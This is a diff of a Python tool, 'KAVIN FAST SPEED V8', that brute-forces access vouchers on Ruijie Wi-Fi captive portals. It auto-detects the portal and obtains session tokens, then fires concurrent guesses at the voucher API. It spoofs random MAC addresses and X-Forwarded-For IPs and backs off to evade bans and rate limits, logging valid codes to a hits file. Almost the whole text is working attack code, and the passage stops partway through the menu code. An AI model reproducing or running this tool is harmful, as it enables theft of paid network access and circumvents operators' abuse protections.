@@ -1,11 +1,20 @@
 #!/usr/bin/env python3
 # =====================================================================
-# kavinv8.py - KAVIN FAST SPEED V8
+# kavinv8.py - KAVIN FAST SPEED V8 (Device Lock Edition)
 # PART 1 of 4
 # =====================================================================
 
-import os, time, random, string, json, asyncio, socket, threading, requests
-import aiohttp, urllib3
+import os
+import time
+import random
+import string
+import json
+import asyncio
+import aiohttp
+import urllib3
+import socket
+import threading
+import requests
 from urllib.parse import urlparse, parse_qs, quote
 from rich.console import Console
 from rich.text import Text
@@ -19,17 +28,29 @@ from rich.align import Align
 
 try:
     import license as _license
+    HAS_LICENSE_MODULE = True
 except ImportError:
+    HAS_LICENSE_MODULE = False
     _license = None
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# =====================================================================
+#  CONFIG
+# =====================================================================
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 25
 RL_SLEEP = 0.1
 MAC_IP_CHANGE_SLEEP = 0.5
+MAC_IP_CHANGE_SLEEP_MAX = 2.0
+MAX_TRIED_CODES = 500_000
+MAX_HITS_DISPLAY = 50
 TIMEOUT_SEC = 10
+
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
+RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
+RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
+
 APP_TITLE = "⚡ KAVIN FAST SPEED V8 ⚡"
 
 console = Console()
@@ -37,17 +58,52 @@ tried_codes = set()
 code_lock = threading.Lock()
 LICENSE_INFO = {"status": ""}
 
-def gen_mac():
-    return ':'.join(map(lambda x: "%02x" % x, [0x00, 0x16, 0x3e, random.randint(0, 127), random.randint(0, 255), random.randint(0, 255)]))
+# =====================================================================
+#  HELPERS
+# =====================================================================
+def generate_random_mac():
+    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f),
+           random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
+    return ':'.join(map(lambda x: "%02x" % x, mac))
 
-def gen_ip():
+def generate_random_ip():
     return f"192.168.110.{random.randint(2, 254)}"
 
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
+def clear_screen():
+    try: os.system('cls' if os.name == 'nt' else 'clear')
+    except Exception: pass
 
-def get_device_id():
-    return _license.get_stable_device_id() if _license else "UNKNOWN"
+def format_time(seconds):
+    try:
+        seconds = int(seconds)
+        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
+    except Exception: return "00:00:00"
+
+def get_my_device_id():
+    if HAS_LICENSE_MODULE:
+        try:
+            return _license.get_stable_device_id()
+        except Exception:
+            pass
+    return "UNKNOWN_DEVICE_ID"
+
+# =====================================================================
+#  LICENSE
+# =====================================================================
+def check_license():
+    if HAS_LICENSE_MODULE:
+        try: return _license.check_approval()
+        except Exception: pass
+    return False, "No license module"
+
+def activate_license(key):
+    if HAS_LICENSE_MODULE:
+        try: return _license.activate(key)
+        except Exception as e: return False, f"Error: {e}"
+    return False, "No license module"
+# =====================================================================
+#  AUTO-DETECT PORTAL
+# =====================================================================
 def get_gateway_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -59,190 +115,681 @@ def get_gateway_ip():
         return '.'.join(parts)
     except: return "192.168.110.1"
 
-def extract_params(url):
-    q = parse_qs(urlparse(url).query)
-    return {k: q[k][0] for k in ['gw_id','gw_sn','gw_address','gw_port','ip','mac','slot_num','nasip','ssid','url','chap_id','chap_challenge'] if k in q}
+def extract_params_from_url(url):
+    parsed = urlparse(url)
+    query = parse_qs(parsed.query)
+    params = {}
+    mapping = {
+        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
+        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
+        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url',
+        'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
+    }
+    for key, mk in mapping.items():
+        if key in query:
+            params[mk] = query[key][0]
+    if 'RES' in query:
+        params['RES'] = query['RES'][0]
+    return params
 
-def auto_detect():
-    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="cyan")), border_style="cyan"))
-    s = requests.Session()
-    s.headers.update({'User-Agent': 'Mozilla/5.0'})
+def auto_detect_portal():
+    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
+                        border_style="cyan", box=ROUNDED))
+    session = requests.Session()
+    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
+
+    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
     try:
-        r = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-        if "ruijienetworks" in r.url: return r.url
+        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
+        if "ruijienetworks" in r.url:
+            console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
+            return r.url
     except: pass
-    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]:
+
+    console.print("[yellow][*][/yellow] Checking Gateways...")
+    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
+    gateways = list(dict.fromkeys(gateways))
+
+    for gw in gateways:
         try:
-            r = s.get(f"http://{gw}", timeout=5)
-            if "ruijienetworks" in r.url: return r.url
+            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
+            if "ruijienetworks" in res.url:
+                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
+                return res.url
         except: pass
     return None
 
-async def fetch_session(session, gw_params, mac, ip):
-    p = dict(gw_params)
-    p['mac'], p['ip'] = mac, ip
-    url = f"{RUIJIE_BASE}/api/auth/wifidog?" + "&".join([f"{k}={quote(str(v))}" for k, v in p.items()])
-    headers = {'User-Agent': 'Mozilla/5.0', 'Client-Mac': mac, 'X-Forwarded-For': ip}
+# =====================================================================
+#  RESUME
+# =====================================================================
+def get_resume_file(mode, length, scan_method):
+    return f"resume_{mode}_{length}_{scan_method}.json"
+
+def load_resume(mode, length, scan_method):
+    fname = get_resume_file(mode, length, scan_method)
+    if not os.path.exists(fname):
+        return None
+    try:
+        with open(fname, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        if data.get("mode") != mode or data.get("length") != length:
+            return None
+        return data
+    except Exception:
+        return None
+
+def save_resume(mode, length, scan_method, seq_counter, tested, tried_count, hits_count, tried_set=None):
+    fname = get_resume_file(mode, length, scan_method)
+    data = {
+        "mode": mode, "length": length, "scan_method": scan_method,
+        "seq_counter": seq_counter, "tested": tested,
+        "tried_count": tried_count, "hits_count": hits_count,
+        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "tried_codes": list(tried_set)[-100000:] if tried_set else [],
+    }
+    try:
+        tmp = fname + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+        os.replace(tmp, fname)
+        return True
+    except Exception:
+        return False
+
+def delete_resume(mode, length, scan_method):
+    fname = get_resume_file(mode, length, scan_method)
+    try:
+        if os.path.exists(fname): os.remove(fname)
+    except Exception: pass
+
+# =====================================================================
+#  SESSION
+# =====================================================================
+async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
+    base = RUIJIE_WIFIDOG
+    if "portal-mm-as" in str(gw_params.get("url", "")):
+        base = base.replace("portal-as", "portal-mm-as")
+
+    temp_params = dict(gw_params)
+    temp_params['mac'] = current_mac_ref[0]
+    temp_params['ip'] = current_ip_ref[0]
+
+    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
+    full_url = f"{base}?{params_str}"
+
+    headers = {
+        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
+        'Client-Mac': current_mac_ref[0],
+        'X-Forwarded-For': current_ip_ref[0],
+        'Connection': 'close'
+    }
+
     try:
         session.cookie_jar.clear()
-        async with session.get(url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r:
-            loc = r.headers.get('Location', '')
-            if loc:
-                if "limited" in loc.lower() or "error" in loc.lower() or "banned" in loc.lower(): return None, "BAN"
-                q = parse_qs(urlparse(loc).query)
+        async with session.get(full_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as resp:
+            location = resp.headers.get('Location', '')
+            if location:
+                loc_lower = location.lower()
+                if ("request limited" in loc_lower or "error.html" in loc_lower
+                        or "errormsg" in loc_lower or "banned" in loc_lower):
+                    return None, "BAN"
+                q = parse_qs(urlparse(location).query)
                 sid = q.get('sessionId', [None])[0]
-                if sid: return {'sessionId': sid, 'sign': q.get('sign', [None])[0], 'timestamp': q.get('timestamp', [None])[0]}, "REAL"
-    except: pass
+                if sid:
+                    return {
+                        'sessionId': sid,
+                        'sign': q.get('sign', [None])[0],
+                        'timestamp': q.get('timestamp', [None])[0],
+                    }, "REAL"
+    except Exception:
+        pass
     return None, "FAILED"
+# =====================================================================
+#  VOUCHER TEST
+# =====================================================================
+async def test_code_official(session, sess_data, code, mac, ip):
+    url = RUIJIE_VOUCHER
+    if sess_data.get('sign') and sess_data.get('timestamp'):
+        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"
 
-async def test_code(session, sess, code, mac, ip):
-    url = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
-    if sess.get('sign') and sess.get('timestamp'):
-        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
-    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "Client-Mac": mac, "X-Forwarded-For": ip}
-    payload = {"accessCode": code, "sessionId": sess['sessionId'], "apiVersion": 1}
-    if sess.get('sign'): payload["sign"] = sess['sign']
-    if sess.get('timestamp'): payload["timestamp"] = sess['timestamp']
+    headers = {
+        "content-type": "application/json",
+        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
+        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
+        "Client-Mac": mac, "X-Forwarded-For": ip,
+    }
+    payload = {
+        "accessCode": code, "sessionId": sess_data['sessionId'], "apiVersion": 1,
+    }
+    if sess_data.get('sign'): payload["sign"] = sess_data['sign']
+    if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
+
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r:
-            if r.status == 429: return "__RL__", "1HR"
+        async with session.post(url, json=payload, headers=headers,
+                                timeout=TIMEOUT_SEC, ssl=False, allow_redirects=True) as r:
+            if r.status == 429:
+                await asyncio.sleep(RL_SLEEP)
+                return "__RATE_LIMITED__", "1HR"
             text = await r.text()
+            if not text: return "__NETWORK_ERROR__", "1HR"
+            final_url = str(r.url).lower()
             low = text.lower()
-            if "limited" in low or "too many" in low: return "__RL__", "1HR"
-            if "session timed out" in low or "invalid session" in low: return "__EXP__", "1HR"
+            if ("request%20limited" in final_url or "request limited" in final_url
+                    or "request limited" in low or "too many" in low):
+                await asyncio.sleep(RL_SLEEP)
+                return "__RATE_LIMITED__", "1HR"
+            if "session timed out" in low or "invalid session" in low:
+                return "__SESSION_EXPIRED__", "1HR"
+
             plan = "1HR"
-            if "24hr" in low or "1day" in low: plan = "24HR"
-            elif "12hr" in low: plan = "12HR"
-            elif "2hr" in low: plan = "2HR"
+            if "24hr" in low or "24 hour" in low or "1day" in low: plan = "24HR"
+            elif "12hr" in low or "12 hour" in low: plan = "12HR"
+            elif "2hr" in low or "2 hour" in low: plan = "2HR"
+
             return text, plan
-    except: return "__ERR__", "1HR"
+    except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
+    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
+    except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"
 
-def gen_code(mode, length):
-    if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
-    if mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-def make_dash(mode, code, tested, elapsed, status, hits, speed, mac, sess_stat, sess_id, ban_count, last_ban):
+# =====================================================================
+#  CODE GENERATOR
+# =====================================================================
+seq_counter = 0
+seq_lock = threading.Lock()
+
+def gen_code(mode, length, scan_method="random"):
+    global seq_counter
+    try:
+        if scan_method == "sequential":
+            with seq_lock:
+                seq_counter += 1
+                current = seq_counter
+            if mode == "num": return str(current).zfill(length)
+            elif mode == "eng":
+                s, n = "", current
+                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
+                return s
+            elif mode == "mix":
+                chars = string.ascii_lowercase + string.digits
+                s, n = "", current
+                for _ in range(length): s = chars[n % 36] + s; n //= 36
+                return s
+        else:
+            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
+            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
+            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    except Exception: pass
+    return ""
+
+# =====================================================================
+#  DASHBOARD
+# =====================================================================
+def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status,
+                              hits, speed, cur_mac, sess_stat, sess_id, ban_count=0, last_ban=""):
     layout = Layout()
-    layout.split_column(Layout(Panel(Align.center(Text(APP_TITLE, style="bold bright_cyan")), border_style="cyan"), size=3), Layout(name="body"))
-    
-    grid = Table.grid(expand=True, padding=(0, 1))
-    grid.add_column(style="bold white"); grid.add_column(style="bold cyan"); grid.add_column(style="bold white"); grid.add_column(style="bold green")
-    
-    sess_style = "bold green" if sess_stat == "REAL" else "bold red"
-    grid.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
-    grid.add_row("  🎯 Mode", f": {mode.upper()}", "  📊 Tested", f": {tested:,}")
-    grid.add_row("  ⚡ Speed", f": {int(speed)} c/m", "  📡 Status", f": {status.upper()}")
-    grid.add_row("  🔑 Hits", f": {len(hits)}", "  📌 Engine", ": RANDOM")
-    grid.add_row("  🖥 MAC", f": ...{mac[-8:]}", "  🔐 Session", f": {sess_stat}", style=sess_style)
-    
-    ban_style = "bold red" if ban_count > 0 else "bold green"
-    grid.add_row("  🚫 Ban Count", f": {ban_count}", "  ⏰ Last Ban", f": {last_ban or '--:--:--'}", style=ban_style)
+    header_text = Text(APP_TITLE, style="bold bright_cyan", justify="center")
+    layout.split_column(
+        Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3),
+        Layout(name="body", ratio=1)
+    )
 
-    v_table = Table(show_header=True, header_style="bold white", expand=True, border_style="green")
+    stats = Table.grid(expand=True, padding=(0, 1))
+    stats.add_column(style="bold white", justify="left")
+    stats.add_column(style="bold cyan", justify="left")
+    stats.add_column(style="bold white", justify="left")
+    stats.add_column(style="bold green", justify="left")
+
+    status_style = "bold red" if any(k in status.upper() for k in ("ERR", "TIMEOUT", "BAN")) else "bold green"
+
+    if sess_stat == "REAL":
+        sess_text = f"REAL ({sess_id[:8]}...)"; sess_style = "bold green"
+    elif sess_stat == "EXPIRED" or "REFRESH" in sess_stat.upper():
+        sess_text = "REFRESHING"; sess_style = "bold red"
+    elif sess_stat == "BANNED":
+        sess_text = "BANNED"; sess_style = "bold red"
+    else:
+        sess_text = sess_stat; sess_style = "bold cyan"
+
+    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
+    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
+    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
+    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
+    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🔐 Session", f": {sess_text}", style=sess_style)
+
+    if ban_count > 0:
+        if "BANNED" in sess_stat.upper() or "REFRESH" in sess_stat.upper():
+            ban_text = f"🚫 {ban_count} (BANNED!)"; ban_style = "bold red"
+        else:
+            ban_text = f"⚠️ {ban_count}"; ban_style = "bold yellow"
+    else:
+        ban_text = "✅ 0"; ban_style = "bold green"
+    last_ban_text = last_ban if last_ban else "--------"
+    stats.add_row("  🚫 Ban Count", f": {ban_text}", "  ⏰ Last Ban", f": {last_ban_text}", style=ban_style)
+
+    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
+    check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}",
+                                          style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
+
+    v_table = Table(show_header=True, header_style="bold bright_white", expand=True,
+                    box=ROUNDED, border_style="green")
     v_table.add_column("Voucher Hits", style="bold green", justify="center")
     v_table.add_column("Plan", style="bold green", justify="center")
-    for h in hits[-10:]: v_table.add_row(h['code'], h['plan'])
-    if not hits: v_table.add_row("No hits yet...", "")
+    v_table.add_column("Remaining", style="bold green", justify="center")
 
-    layout["body"].split_column(
-        Layout(Panel(grid, border_style="magenta"), size=7),
-        Layout(Panel(Align.center(Text(f"Check Code : {code}", style="bold yellow")), border_style="yellow"), size=3),
+    for h in hits[-MAX_HITS_DISPLAY:]:
+        v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
+    if not hits: v_table.add_row("", "", "")
+
+    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
+    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
+
+    body_layout = Layout()
+    body_layout.split_column(
+        Layout(stats_panel, size=7),
+        Layout(check_panel, size=3),
         Layout(v_table, ratio=1),
-        Layout(Panel(Align.center(Text("✨ Thank You For Choosing @kavin799 Tools ✨", style="bold bright_yellow")), border_style="red"), size=3)
+        Layout(footer_panel, size=3)
     )
+    layout["body"].update(body_layout)
     return layout
-async def scan_loop(gw_params):
-    current_mac, current_ip, sess = [gen_mac()], [gen_ip()], [None]
-    tested, hits, ban_count, last_ban = 0, [], 0, ""
-    sess_stat, sess_id = "--------", "--------"
-    start_time = time.time()
-    
-    connector = aiohttp.TCPConnector(limit=50, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        live = Live(make_dash("MIX", "", 0, "00:00:00", "INIT", [], 0, current_mac[0], sess_stat, sess_id, 0, ""), refresh_per_second=2, screen=False)
+# =====================================================================
+#  SCAN LOOP
+# =====================================================================
+async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
+    global seq_counter, tried_codes
+    tried_codes = set()
+    seq_counter = 0
+
+    resume_data = load_resume(mode, length, scan_method)
+    resume_choice = None
+
+    if resume_data:
+        console.print()
+        console.print(Panel(
+            Align.center(Text.assemble(
+                ("📂 CHECKPOINT FOUND\n", "bold yellow"),
+                (f"Mode: {resume_data['mode'].upper()}_{resume_data['length']}  |  ", "cyan"),
+                (f"Tested: {resume_data['tested']:,}\n", "green"),
+                (f"Saved: {resume_data['saved_at']}", "dim")
+            )), border_style="yellow", box=ROUNDED
+        ))
+        choice = Prompt.ask("  [bold cyan]➜ Continue from checkpoint?[/bold cyan]",
+                             choices=["y", "n"], default="y").strip().lower()
+        if choice == "y":
+            resume_choice = resume_data
+            seq_counter = resume_data.get("seq_counter", 0)
+            for c in resume_data.get("tried_codes", []):
+                tried_codes.add(c)
+            console.print(f"[bold green]✅ Resuming from tested={resume_data['tested']:,}, seq={seq_counter}[/bold green]")
+            time.sleep(1)
+        else:
+            delete_resume(mode, length, scan_method)
+            console.print("[bold yellow]🆕 Starting fresh[/bold yellow]")
+            time.sleep(1)
+
+    initial_tested = resume_choice["tested"] if resume_choice else 0
+
+    if not gw_params:
+        gw_params = {
+            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
+            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
+            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
+            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
+            "url": "http://connectivitycheck.gstatic.com/generate_204",
+            "chap_id": r"\245",
+            "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
+        }
+
+    mode_str = f"{mode}_{length}"
+    hits, tested, start_time = [], initial_tested, time.time()
+    current_code = [""]
+    current_status = ["Init"]
+    sess_stat = ["--------"]
+    sess_id = ["--------"]
+
+    current_mac = [generate_random_mac()]
+    current_ip  = [generate_random_ip()]
+    sess_data   = [None]
+
+    ban_count = [0]
+    last_ban_time = [""]
+    current_sleep = [MAC_IP_CHANGE_SLEEP]
+    ban_streak = [0]
+    last_save = [time.time()]
+
+    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
+    conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
+
+    async with aiohttp.ClientSession(connector=conn_limit) as session:
+        live = Live(get_dashboard_renderable(
+            mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0,
+            current_mac[0], sess_stat[0], sess_id[0], ban_count=0, last_ban=""
+        ), refresh_per_second=2, screen=False)
+
         with live:
             try:
                 while True:
-                    if sess[0] is None:
-                        res, msg = await fetch_session(session, gw_params, current_mac[0], current_ip[0])
-                        if not res:
-                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
-                            ban_count += 1
-                            last_ban = time.strftime("%H:%M:%S")
-                            sess_stat = "REFRESHING"
-                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
+                    if sess_data[0] is None:
+                        current_status[0] = "Active"
+                        res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
+
+                        if res is None or res == "BAN":
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "REFRESHING"
+                            sess_id[0] = "--------"
+
+                            ban_count[0] += 1
+                            last_ban_time[0] = time.strftime("%H:%M:%S")
+                            ban_streak[0] += 1
+                            if ban_streak[0] >= 3:
+                                current_sleep[0] = min(current_sleep[0] + 0.25, MAC_IP_CHANGE_SLEEP_MAX)
+                                ban_streak[0] = 0
+
+                            if ban_count[0] >= 20 and ban_count[0] % 10 == 0:
+                                console.print(f"\n[bold red]⚠️ {ban_count[0]} bans! Consider increasing MAC_IP_CHANGE_SLEEP or lowering concurrency.[/bold red]")
+
+                            await asyncio.sleep(current_sleep[0])
                             continue
-                        sess[0], sess_stat, sess_id = res, "REAL", res['sessionId'][:8]
 
-                    batch = []
-                    while len(batch) < CONCURRENCY_LIMIT:
-                        c = gen_code("mix", 6)
-                        with code_lock:
-                            if c not in tried_codes:
-                                tried_codes.add(c); batch.append(c)
-                    if not batch: continue
+                        ban_streak[0] = 0
+                        current_sleep[0] = MAC_IP_CHANGE_SLEEP
+                        sess_data[0] = res
+                        sess_stat[0] = err_msg
+                        sess_id[0] = res.get('sessionId', '--------')
 
-                    async def check(c):
-                        async with asyncio.Semaphore(CONCURRENCY_LIMIT):
-                            return await test_code(session, sess[0], c, current_mac[0], current_ip[0])
+                    batch_codes = []
+                    while len(batch_codes) < CONCURRENCY_LIMIT:
+                        c = gen_code(mode, length, scan_method)
+                        if c:
+                            with code_lock:
+                                if c in tried_codes: continue
+                                tried_codes.add(c)
+                                if len(tried_codes) > MAX_TRIED_CODES:
+                                    tried_codes.clear()
+                            batch_codes.append(c)
+                    if not batch_codes:
+                        await asyncio.sleep(0.01); continue
 
-                    results = await asyncio.gather(*[check(c) for c in batch])
-                    
-                    for idx, (res, plan) in enumerate(results):
+                    async def bounded_check(code):
+                        async with semaphore:
+                            return await test_code_official(session, sess_data[0], code, current_mac[0], current_ip[0])
+
+                    tasks = [bounded_check(code) for code in batch_codes]
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+
+                    hit_found_in_batch = False
+                    session_expired_in_batch = False
+
+                    for idx, res_tuple in enumerate(results):
                         tested += 1
-                        if res == "__EXP__" or res == "__RL__":
-                            sess[0] = None
-                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
-                            if res == "__RL__":
-                                ban_count += 1
-                                last_ban = time.strftime("%H:%M:%S")
-                                sess_stat = "BANNED"
-                            else:
-                                sess_stat = "EXPIRED"
-                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
+                        code = batch_codes[idx]
+                        current_code[0] = code
+
+                        if isinstance(res_tuple, Exception): continue
+                        res, plan = res_tuple
+
+                        if res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
+                            with code_lock:
+                                tried_codes.discard(code)
+                            continue
+
+                        if res == "__SESSION_EXPIRED__":
+                            sess_data[0] = None
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "EXPIRED (Refreshing)"
+                            session_expired_in_batch = True
+                            for rc in batch_codes[idx:]:
+                                with code_lock:
+                                    tried_codes.discard(rc)
+                            await asyncio.sleep(current_sleep[0])
                             break
-                        
-                        if '"success":true' in res.lower() or '"logonUrl"' in res:
-                            hits.append({"code": batch[idx], "plan": plan})
-                            sess[0] = None
-                            current_mac[0], current_ip[0] = gen_mac(), gen_ip()
-                            sess_stat = "HIT"
-                            with open(HITS_FILE, "a") as f: f.write(f"CODE: {batch[idx]} | PLAN: {plan}\n")
-                            await asyncio.sleep(MAC_IP_CHANGE_SLEEP)
+
+                        if res == "__RATE_LIMITED__":
+                            sess_data[0] = None
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "BANNED"
+                            hit_found_in_batch = True
+                            ban_count[0] += 1
+                            last_ban_time[0] = time.strftime("%H:%M:%S")
+                            ban_streak[0] += 1
+                            if ban_streak[0] >= 3:
+                                current_sleep[0] = min(current_sleep[0] + 0.25, MAC_IP_CHANGE_SLEEP_MAX)
+                                ban_streak[0] = 0
+                            for rc in batch_codes[idx:]:
+                                with code_lock:
+                                    tried_codes.discard(rc)
+                            await asyncio.sleep(current_sleep[0])
+                            break
+
+                        if res.startswith("__ERROR__:"):
+                            continue
+
+                        low = res.lower()
+                        if "request limited" in low or "blocked" in low or "too many" in low:
+                            sess_data[0] = None
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "BANNED"
+                            hit_found_in_batch = True
+                            ban_count[0] += 1
+                            last_ban_time[0] = time.strftime("%H:%M:%S")
+                            ban_streak[0] += 1
+                            if ban_streak[0] >= 3:
+                                current_sleep[0] = min(current_sleep[0] + 0.25, MAC_IP_CHANGE_SLEEP_MAX)
+                                ban_streak[0] = 0
+                            for rc in batch_codes[idx:]:
+                                with code_lock:
+                                    tried_codes.discard(rc)
+                            await asyncio.sleep(current_sleep[0])
+                            break
+
+                        is_hit = False
+                        logon_url = ""
+                        try:
+                            j = json.loads(res)
+                            if j.get("success") is True and isinstance(j.get("result"), dict):
+                                logon_url = j["result"].get("logonUrl", "")
+                                if logon_url: is_hit = True
+                        except Exception:
+                            if ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low):
+                                is_hit = True
+
+                        if is_hit:
+                            now_str = time.strftime("%H:%M:%S")
+                            hits.append({"code": code, "time": now_str, "plan": plan, "url": logon_url})
+                            try:
+                                with open(HITS_FILE, "a", encoding="utf-8") as f:
+                                    if logon_url:
+                                        f.write(f"[{now_str}] CODE: {code} | PLAN: {plan} | URL: {logon_url}\n")
+                                    else:
+                                        f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
+                            except Exception: pass
+
+                            sess_data[0] = None
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "HIT (Refreshing)"
+                            hit_found_in_batch = True
+                            await asyncio.sleep(current_sleep[0])
                             break
 
                     elapsed = time.time() - start_time
-                    speed = (tested / elapsed * 60) if elapsed > 0 else 0
-                    live.update(make_dash("MIX", batch[-1], tested, f"{int(elapsed//3600):02d}:{int((elapsed%3600)//60):02d}:{int(elapsed%60):02d}", "ACTIVE", hits, speed, current_mac[0], sess_stat, sess_id, ban_count, last_ban))
-            except Exception as e:
-                pass
+                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
 
+                    if time.time() - last_save[0] >= 5:
+                        save_resume(mode, length, scan_method, seq_counter, tested,
+                                    len(tried_codes), len(hits), tried_codes)
+                        last_save[0] = time.time()
+
+                    live.update(get_dashboard_renderable(
+                        mode_str, scan_method, current_code[0], tested, format_time(elapsed),
+                        current_status[0], hits, speed, current_mac[0],
+                        sess_stat[0], sess_id[0],
+                        ban_count=ban_count[0], last_ban=last_ban_time[0]
+                    ))
+
+                    if hit_found_in_batch: await asyncio.sleep(0.05)
+                    if session_expired_in_batch: await asyncio.sleep(0.05)
+
+            except (KeyboardInterrupt, asyncio.CancelledError):
+                save_resume(mode, length, scan_method, seq_counter, tested,
+                            len(tried_codes), len(hits), tried_codes)
+                live.stop()
+                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
+                console.print(f"[bold green]💾 Progress saved! Resume next time.[/bold green]")
+            except Exception as e:
+                live.stop()
+                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")
+
+# =====================================================================
+#  UI / MENU
+# =====================================================================
+def show_banner():
+    clear_screen()
+    console.print()
+    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+    console.print(Text(APP_TITLE, style="bold bright_white"), justify="center")
+    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+    console.print()
+
+def ask_mode():
+    while True:
+        show_banner()
+        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
